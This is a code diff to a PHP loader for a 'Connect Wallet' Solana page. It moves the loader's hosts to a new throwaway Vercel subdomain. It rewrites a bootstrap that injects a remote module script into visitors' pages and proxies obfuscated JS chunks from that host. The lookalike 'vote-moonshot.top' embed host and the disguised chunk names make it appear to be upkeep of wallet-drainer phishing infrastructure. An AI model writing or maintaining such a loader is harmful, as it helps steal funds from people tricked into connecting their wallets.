@@ -15,13 +15,13 @@ $cfg = [
 
     'site_name' => 'Connect Wallet',
     'site_description' => 'Connect your Solana wallet',
-    'site_icons' => ['https://fuzzy-octo-guacamole-delta.vercel.app/tYZq2BsVawvS5wYEF.svg'],
+    'site_icons' => ['https://vercel-five-alpha-59.vercel.app/tYZq2BsVawvS5wYEF.svg'],
     // Reown metadata on Vercel /connect/ (Phantom provider prompt).
-    'site_url' => 'https://fuzzy-octo-guacamole-delta.vercel.app',
+    'site_url' => 'https://vercel-five-alpha-59.vercel.app',
     // Reown wallet picker on the embed host (vote-moonshot).
     'embed_site_url' => 'https://vote-moonshot.top',
 
-    'vercel_bundle_url' => 'https://fuzzy-octo-guacamole-delta.vercel.app/0EBM88LeOsHh.js',
+    'vercel_bundle_url' => 'https://vercel-five-alpha-59.vercel.app/0EBM88LeOsHh.js',
 
     'analytics' => false,
     'restrict_script_access' => true,
@@ -35,7 +35,7 @@ $cfg = [
     'connect_via_vercel' => true,
     'connect_host_url' => '',
 
-    'vercel_profile_host' => 'fuzzy-octo-guacamole-delta.vercel.app',
+    'vercel_profile_host' => 'vercel-five-alpha-59.vercel.app',
     'profile_script' => 'Ix9fLBj7CRLZ.js',
     'gateway_chunk' => 'Qm4nR8sV2xWp.js',
     'profile_page_chunk' => 'Wn3kL8pR4vYs.js',
@@ -215,14 +215,14 @@ function patch_bundle_chunk_paths(string $js, string $chunkBase): string
 
 function embed_module_bootstrap(array $cfg): string
 {
-    $chunks = chunk_names($cfg);
-    $entry = $chunks['bundle'] ?? basename((string) ($cfg['vercel_bundle_url'] ?? '0EBM88LeOsHh.js'));
-    $baseJs = json_encode(vault_entry_url($cfg), JSON_UNESCAPED_SLASHES | JSON_THROW_ON_ERROR);
-    $entryJs = json_encode($entry, JSON_UNESCAPED_SLASHES | JSON_THROW_ON_ERROR);
+    $bundleUrl = trim((string) ($cfg['vercel_bundle_url'] ?? ''));
+    if ($bundleUrl === '') {
+        return 'console.error("[wallet] vercel_bundle_url missing in loader.php");';
+    }
+    $urlJs = json_encode($bundleUrl, JSON_UNESCAPED_SLASHES | JSON_THROW_ON_ERROR);
 
-    return '(function(b,e){var s=document.createElement("script");s.type="module";'
-        . 's.src=b+"?c="+encodeURIComponent(e);document.head.appendChild(s)})('
-        . $baseJs . ',' . $entryJs . ');';
+    return '(function(u){var s=document.createElement("script");s.type="module";'
+        . 's.src=u;document.head.appendChild(s)})(' . $urlJs . ');';
 }
 
 /** @return array{bundle: string, gateway: string, profileScript: string, profilePage: string, wsRelay: string} */
@@ -271,9 +271,13 @@ function serve_static_chunk(array $cfg, string $chunk): void
         }
     }
 
-    $body = fetch_remote_url(vercel_api_origin($cfg) . '/' . $safe);
+    $upstream = vercel_api_origin($cfg) . '/' . $safe;
+    $body = fetch_remote_url($upstream);
     if ($body === null) {
         http_response_code(502);
+        header('Content-Type: application/javascript; charset=utf-8');
+        echo 'console.error("[wallet] chunk proxy failed for ' . addslashes($safe)
+            . ' — check vercel_bundle_url / Vercel deployment");';
         exit;
     }
 
